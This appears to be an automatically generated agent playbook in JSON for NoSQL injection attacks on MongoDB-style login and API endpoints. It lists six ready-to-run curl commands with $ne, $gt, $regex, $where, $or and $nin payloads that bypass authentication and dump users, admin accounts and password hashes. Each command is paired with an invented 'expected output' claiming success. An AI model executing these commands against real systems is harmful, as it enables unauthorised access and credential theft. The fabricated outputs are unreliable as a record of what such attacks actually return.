{
  "name": "nosql_injection_testing",
  "description": "NoSQL injection attacks targeting MongoDB, CouchDB, and other NoSQL databases",
  "pattern": "nosql.*inject|mongodb.*inject|nosql.*attack|mongo.*payload",
  "parameters": ["target_url", "database_type"],
  "sequence": [
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "curl -X POST '{{target_url}}/login' -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":{\"$ne\":\"\"}}' -v"]},
      "expected_output": {"type": "string", "example": "POST /login HTTP/1.1\nContent-Type: application/json\n\nHTTP/1.1 200 OK\nSet-Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\n\n{\"success\":true,\"message\":\"Login successful\",\"user\":\"admin\",\"role\":\"administrator\"}\n\nNoSQL injection successful - bypassed authentication using $ne operator"}
    },
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "curl -X POST '{{target_url}}/api/users' -H 'Content-Type: application/json' -d '{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}' | jq ."]},
      "expected_output": {"type": "string", "example": "{\n  \"users\": [\n    {\"_id\":\"507f1f77bcf86cd799439011\",\"username\":\"admin\",\"email\":\"admin@site.com\",\"role\":\"admin\"},\n    {\"_id\":\"507f1f77bcf86cd799439012\",\"username\":\"john_doe\",\"email\":\"john@site.com\",\"role\":\"user\"},\n    {\"_id\":\"507f1f77bcf86cd799439013\",\"username\":\"testuser\",\"email\":\"test@site.com\",\"role\":\"user\"}\n  ],\n  \"count\": 3\n}\n\nAll users extracted using $gt operator - authentication bypassed"}
    },
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "curl -s '{{target_url}}/api/search?query[$regex]=admin.*&query[$options]=i' | jq ."]},
      "expected_output": {"type": "string", "example": "{\n  \"results\": [\n    {\"username\":\"admin\",\"email\":\"admin@webapp.com\",\"role\":\"administrator\"},\n    {\"username\":\"admin_backup\",\"email\":\"backup@webapp.com\",\"role\":\"administrator\"},\n    {\"username\":\"site_admin\",\"email\":\"siteadmin@webapp.com\",\"role\":\"administrator\"}\n  ]\n}\n\nRegex injection successful - extracted all admin accounts using $regex"}
    },
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "curl -X POST '{{target_url}}/login' -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":{\"$where\":\"return true\"}}' -v"]},
      "expected_output": {"type": "string", "example": "HTTP/1.1 200 OK\n\n{\"success\":true,\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.xyz\"}\n\nJavaScript injection via $where operator - authentication bypassed\nWARNING: $where is deprecated but still works on older MongoDB versions"}
    },
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "curl -s '{{target_url}}/api/users?filter[$or][0][role]=admin&filter[$or][1][role]=superuser' | jq ."]},
      "expected_output": {"type": "string", "example": "{\n  \"users\": [\n    {\"_id\":\"507f191e810c19729de860ea\",\"username\":\"admin\",\"role\":\"admin\",\"privileges\":[\"read\",\"write\",\"delete\"]},\n    {\"_id\":\"507f191e810c19729de860eb\",\"username\":\"superadmin\",\"role\":\"superuser\",\"privileges\":[\"all\"]},\n    {\"_id\":\"507f191e810c19729de860ec\",\"username\":\"admin_backup\",\"role\":\"admin\",\"privileges\":[\"read\",\"write\"]}\n  ]\n}\n\nLogical operator injection using $or - extracted privileged accounts"}
    },
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "curl -X POST '{{target_url}}/api/query' -H 'Content-Type: application/json' -d '{\"user\":{\"$nin\":[\"guest\",\"anonymous\"]}}' | jq ."]},
      "expected_output": {"type": "string", "example": "{\n  \"results\": [\n    {\"username\":\"admin\",\"password_hash\":\"$2b$10$N9qo8uLOickgx2ZMRZoMye.IjzLUDx\",\"email\":\"admin@site.com\"},\n    {\"username\":\"john_doe\",\"password_hash\":\"$2b$10$abcdefghijklmnopqrstuvwxy\",\"email\":\"john@site.com\"},\n    {\"username\":\"manager\",\"password_hash\":\"$2b$10$zyxwvutsrqponmlkjihgfedcba\",\"email\":\"mgr@site.com\"}\n  ],\n  \"count\": 3\n}\n\nUsing $nin (not in) operator - extracted all non-guest user credentials"}
    }
  ],
  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
  "created_by": "neural_mesh_v5.2_generator"
}
